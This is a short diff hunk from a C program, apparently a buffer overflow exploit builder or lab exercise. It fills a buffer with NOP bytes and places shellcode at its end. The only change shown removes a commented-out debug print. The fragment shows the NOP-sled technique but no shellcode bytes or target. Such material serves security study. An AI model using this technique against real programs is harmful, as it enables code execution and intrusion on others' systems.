@@ -26,7 +26,6 @@ int main(void)
 	for (i = 0; i < bsize; i++){
 		buff[i] = NOP;
 	}
-	//printf("the size of input is %d\n",strlen(buff));
 
 	ptr = buff + bsize - strlen(shellcode)  - 1 ;
 	for (i=0; i<strlen(shellcode); i++){
